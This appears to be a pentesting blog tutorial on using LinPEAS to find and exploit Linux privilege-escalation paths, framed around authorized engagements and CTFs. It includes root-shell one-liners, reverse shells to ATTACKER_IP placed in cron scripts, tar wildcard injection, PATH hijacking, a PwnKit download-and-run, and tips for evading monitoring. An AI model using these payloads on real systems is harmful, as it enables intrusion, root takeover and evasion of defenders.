---
title: 'LinPEAS: Automated Linux Privilege Escalation and Enumeration'
slug: linpeas-privesc-guide
description: 'Learn how to use LinPEAS for Linux privilege escalation enumeration: SUID, sudo, cron, capabilities, kernel exploits, PATH hijacking, and CTF scenarios with real command examples.'
image: /linpeas-priv-esc-linux.webp
draft: false
date: 2026-06-19T00:00:00.000Z
categories:
  - linux
subcategories:
  - privilege-escalation
tags:
  - linpeas
  - Linux Privesc
---

# LinPEAS: Automated Linux Privilege Escalation and Enumeration

Once you have a low-privilege shell on a Linux target, the next problem is finding the path to root. Manual enumeration works, but it's slow and inconsistent — you'll miss things. LinPEAS automates the entire process: it runs hundreds of checks across SUID binaries, sudo rules, cron jobs, writable paths, credentials in config files, kernel version against known CVEs, and dozens of other vectors, then highlights the most promising findings in color-coded output so you can prioritize immediately.

LinPEAS is part of the [PEASS-ng suite](https://github.com/peass-ng/PEASS-ng) by Carlos Polop. It's a shell script with no external dependencies — it runs anywhere `/bin/sh` is available, including restricted environments. It's one of the most used tools in authorized Linux engagements — see [HackITA's penetration testing tools guide](https://hackita.it/articoli/tool-penetration-testing/) for the full toolkit overview. For the broader Linux privilege escalation methodology that LinPEAS automates, see [HackITA's Linux privesc guide](https://hackita.it/articoli/linux-privesc/).

***

## Transferring LinPEAS to the Target

The fastest method is piping directly from GitHub if the target has outbound internet access:

```bash
curl https://raw.githubusercontent.com/peass-ng/PEASS-ng/master/linPEAS/linpeas.sh | sh
```

If the target has no internet access, serve it from your attacking machine using Python's HTTP server:

```bash
# On attacker
python3 -m http.server 8080

# On target
curl http://ATTACKER_IP:8080/linpeas.sh | sh
```

Without curl, use netcat or `/dev/tcp`:

```bash
# On attacker
nc -q 5 -lvnp 80 < linpeas.sh

# On target
cat < /dev/tcp/ATTACKER_IP/80 | sh
```

To avoid writing the script to disk (reduces forensic traces), pipe directly to `sh` rather than writing to a file first. If you need to save the binary-colored output for later review:

```bash
curl https://raw.githubusercontent.com/peass-ng/PEASS-ng/master/linPEAS/linpeas.sh | sh > /dev/shm/linpeas.txt
less -r /dev/shm/linpeas.txt
```

Writing to `/dev/shm` keeps it in memory rather than on disk. The `-r` flag on `less` renders the ANSI color codes correctly.

***

## Execution Flags

Run without flags for a full default scan:

```bash
bash linpeas.sh
```

The `-a` flag enables all checks, including slower ones that are skipped by default — useful when you have time and want maximum coverage:

```bash
bash linpeas.sh -a
```

The `-s` flag runs a fast scan, skipping time-consuming checks. Use this when you need quick results:

```bash
bash linpeas.sh -s
```

The `-o` flag lets you run only specific check categories instead of the full suite. Useful in long engagements when you want targeted output:

```bash
bash linpeas.sh -o SysI,Devs,AvaDev,ProCronSrvcsTmrsSocks,Net,UsrI,SofI,IntFiles
```

To analyze a folder of files offline (for reviewing a mounted filesystem):

```bash
bash linpeas.sh -f /path/to/folder
```

***

## Reading the Output

LinPEAS uses color coding to communicate risk level at a glance:

**Red/Yellow background** — Critical findings. These are high-confidence privilege escalation vectors that have worked in the past: writable `/etc/passwd`, SUID binaries with known GTFOBins entries, `sudo NOPASSWD` rules on dangerous binaries.

**Red text** — High-interest findings worth investigating: unknown SUID binaries, world-writable cron scripts, credentials in config files, unusual capabilities.

**Yellow text** — Interesting but lower confidence: non-standard binaries, unusual permissions, potentially outdated software.

**Green text** — System information with no immediate risk, useful for context.

The key discipline when reading LinPEAS output is to start at the red/yellow highlighted lines and work down in priority — don't read linearly. LinPEAS prints a lot; the color coding exists precisely so you don't have to.

A real output snippet from a vulnerable machine looks like this:

```
╔══════════╣ Checking 'sudo -l'
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-and-suid
User www-data may run the following commands:
    (ALL : ALL) NOPASSWD: /usr/bin/php

╔══════════╣ SUID - Check easy privesc, exploits and write perms
-rwsr-xr-x 1 root root 1113504 Apr 4 2022 /usr/bin/screen-4.5.0

╔══════════╣ Capabilities
/usr/bin/python3.6 = cap_setuid+ep

╔══════════╣ Cron jobs
* * * * * root /opt/scripts/backup.sh
╚ /opt/scripts/backup.sh is writable by current user!
```

Every line with a `╚` pointing to a HackTricks URL is a confirmed attack surface. Start there.

***

## What LinPEAS Checks and Why It Matters

**Sudo rules** — LinPEAS runs `sudo -l` and highlights any `NOPASSWD` entries. A rule like `(ALL) NOPASSWD: /usr/bin/vim` means you can open a root shell via `:!/bin/bash` from inside vim without a password. GTFOBins covers exploitation paths for every binary that commonly appears in sudo rules.

**SUID and SGID binaries** — LinPEAS finds all SUID binaries on the system and cross-references them against known vulnerable versions. Non-standard SUID binaries — those not present in a default installation — are the first thing to examine. Find them manually with:

```bash
find / -perm -4000 -type f 2>/dev/null
find / -perm -2000 -type f 2>/dev/null  # SGID
```

Once you have a binary, look it up on [GTFOBins](https://gtfobins.github.io). For example, if `vim` has the SUID bit set:

```bash
vim -c ':!/bin/sh'
```

If `find` is SUID:

```bash
find . -exec /bin/sh -p \; -quit
```

If `python` or `python3` is SUID:

```bash
python3 -c 'import os; os.execl("/bin/sh", "sh", "-p")'
```

The `-p` flag preserves the effective UID (root) when spawning the shell. Without it, many shells drop privileges on launch. For a dedicated breakdown of SUID exploitation paths, see [HackITA's SUID guide](https://hackita.it/articoli/suid/).

**World-writable cron jobs** — A cron script that runs as root but is writable by your user is a direct path to root. LinPEAS identifies writable cron scripts and highlights them in red. Check manually with:

```bash
cat /etc/crontab
ls -la /etc/cron*
crontab -l
find /var/spool/cron /etc/cron* -writable 2>/dev/null
```

If you find a writable script run by root, append a payload. Quickest option — set SUID on bash:

```bash
echo 'chmod u+s /bin/bash' >> /path/to/writable_cron_script.sh
```

Then wait for the cron to fire and run:

```bash
bash -p
```

Or add a reverse shell directly if you want an interactive session:

```bash
echo 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1' >> /path/to/writable_cron_script.sh
```

**Cron wildcard injection** — When a cron job runs a command like `cd /var/backups && tar czf backup.tar.gz *`, the wildcard `*` gets expanded by the shell before `tar` sees it. Files named like command-line flags are interpreted as options. Drop these three files in the target directory:

```bash
echo "" > '--checkpoint=1'
echo "" > '--checkpoint-action=exec=sh shell.sh'
echo 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1' > shell.sh
```

When cron runs `tar *`, it expands to `tar czf backup.tar.gz --checkpoint=1 --checkpoint-action=exec=sh shell.sh ...` and executes your shell as root. Works with `rsync`, `find`, and other tools that accept flag-like arguments from wildcard expansion.

**Credentials in files** — LinPEAS searches config files, history files, and common credential locations for passwords, API keys, and tokens. Database credentials stored in web app config files (`wp-config.php`, `.env`, `config.php`) frequently reuse the system root password or belong to a user with sudo rights.

**Writable paths in root's PATH** — If a directory writable by your user appears before system directories in root's PATH, and a root-owned script or SUID binary calls another program by relative name (without full path), you can shadow that program with a malicious version.

LinPEAS flags writable directories in the PATH. Check manually:

```bash
echo $PATH
find / -writable -type d 2>/dev/null | grep -E "^(/usr|/opt|/bin|/sbin)" | head -20
```

The classic exploitation scenario: a SUID binary or a sudo-allowed script calls `service`, `python`, `curl`, or any other binary by relative name. If `/tmp` or another writable directory is in PATH before `/usr/bin`, you create a malicious version:

```bash
# Create malicious binary with the same name as what root's script calls
cat > /tmp/service << 'EOF'
#!/bin/bash
chmod u+s /bin/bash
EOF
chmod +x /tmp/service

# Prepend writable directory to PATH
export PATH=/tmp:$PATH

# Trigger root execution (e.g., via sudo)
sudo /path/to/vulnerable_script.sh
```

Once `/bin/bash` has the SUID bit: `bash -p` drops you into a root shell.

**PATH hijacking via sudo** — A common real-world case: `sudo env_reset` is off, or `secure_path` isn't set in `/etc/sudoers`. Check with:

```bash
sudo -l
```

If you see `env_keep+=PATH` or the sudoers file doesn't set `secure_path`, your current PATH propagates to the sudo execution context, making PATH hijacking straightforward.

**Kernel version** — LinPEAS prints the kernel version and checks it against known local privilege escalation CVEs. A vulnerable kernel is a reliable escalation path when nothing else is immediately obvious. Cross-reference the output with `searchsploit` or `linux-exploit-suggester`.

**Capabilities** — Linux capabilities are a finer-grained alternative to SUID. Binaries with `cap_setuid+ep` or `cap_net_raw+ep` can escalate privileges in ways that aren't obvious from a standard permission check. LinPEAS enumerates all binaries with capabilities set. Verify manually:

```bash
getcap -r / 2>/dev/null
```

If `python3` has `cap_setuid+ep`:

```bash
python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
```

If `perl` has `cap_setuid+ep`:

```bash
perl -e 'use POSIX qw(setuid); setuid(0); exec "/bin/bash";'
```

The key difference from SUID: these binaries look normal in a standard `ls -la` — only `getcap` or LinPEAS reveals the capability. Easy to miss manually.

**Kernel version** — LinPEAS prints the kernel version and checks it against known local privilege escalation CVEs. Cross-reference with `searchsploit`:

```bash
searchsploit linux kernel $(uname -r)
```

For a broader look at how attackers chain these privilege escalation vectors in real environments, LinuxSecurity published a detailed breakdown: [Linux Privilege Escalation Patterns](https://linuxsecurity.com/features/linux-privilege-escalation-patterns).

For PwnKit (CVE-2021-4034), which affects polkit on virtually every Linux distro before January 2022:

```bash
cd /tmp
wget https://github.com/berdav/CVE-2021-4034/raw/main/cve-2021-4034.c
gcc cve-2021-4034.c -o pwnkit
./pwnkit
# uid=0(root) gid=0(root)
```

LinPEAS flags it as `[!] CVE-2021-4034 (PwnKit) - Highly probable exploit` when the vulnerable polkit version is detected.

**NFS exports** — `no_root_squash` in `/etc/exports` means a remote client mounting that share can write files as root on the server. LinPEAS flags this configuration.

***

## Practical CTF Scenario: Web Shell to Root

**Context:** You have a PHP web shell on an Apache server running as `www-data`. The box is Ubuntu 18.04.

**Step 1 — Upgrade to interactive shell:**

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
export TERM=xterm
# Ctrl+Z → stty raw -echo; fg
```

**Step 2 — Run LinPEAS in-memory and save output:**

```bash
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | bash 2>/dev/null | tee /dev/shm/lp.txt
```

**Step 3 — Read critical findings:**

```bash
grep -E "NOPASSWD|SUID|writable|cap_setuid|CVE" /dev/shm/lp.txt
```

**Output:**

```
User www-data may run: (ALL) NOPASSWD: /usr/bin/php
-rwsr-xr-x 1 root root /usr/bin/screen-4.5.0
/usr/bin/python3.6 = cap_setuid+ep
* * * * * root /opt/scripts/backup.sh  ← writable!
```

**Step 4 — Pick the fastest path.** Here `sudo php` is instant:

```bash
sudo /usr/bin/php -r 'system("/bin/bash");'
# root@target:/var/www/html#
```

**Step 5 — Grab the flag:**

```bash
cat /root/root.txt
```

Total time from web shell to root: \~3 minutes.

***

## Stealth: Reducing LinPEAS Noise

LinPEAS is loud — it spawns hundreds of `find` calls and generates log entries. On monitored systems, run it with stderr suppressed and use the fast flag:

```bash
bash linpeas.sh -s 2>/dev/null
```

Output to RAM only, never touch disk:

```bash
curl -L https://[...]/linpeas.sh | bash -s -- -s 2>/dev/null > /dev/shm/.x
grep -E "NOPASSWD|SUID|writable|cap_setuid" /dev/shm/.x
rm /dev/shm/.x
```

If you need only specific check categories to minimize execution time:

```bash
bash linpeas.sh -o SysI,Sudo,SUID,Cron 2>/dev/null
```

Even with these precautions, LinPEAS is still visible in `ps aux` during execution. On EDR-monitored boxes, consider running it during a maintenance window or when blue team activity is low.

**Does LinPEAS write anything to disk by default?**
No. By default it doesn't write files and doesn't attempt `su` to other users. If you pipe output to a file, that file is created by your shell, not LinPEAS itself.

**Why use `/dev/shm` for output files?**
`/dev/shm` is a tmpfs mount — it lives in RAM, not on the physical disk. Files written there disappear on reboot and don't create disk artifacts in the same way. It's not truly forensically invisible, but it reduces on-disk evidence.

**LinPEAS is returning almost no red output — does that mean the machine is hardened?**
Not necessarily. LinPEAS covers common misconfigurations but isn't exhaustive. Run it with `-a` for full coverage, and also check manually for application-specific paths (database credentials, custom SUID binaries installed by the app, writable service files).

**Is LinPEAS detectable?**
Yes. By default LinPEAS spawns dozens of `find` commands in rapid succession — this is one of the behavioral signatures that auditd and EDRs look for. A spike of 50+ `find` calls from the same PID within 30 seconds is anomalous and will fire detection rules in monitored environments.
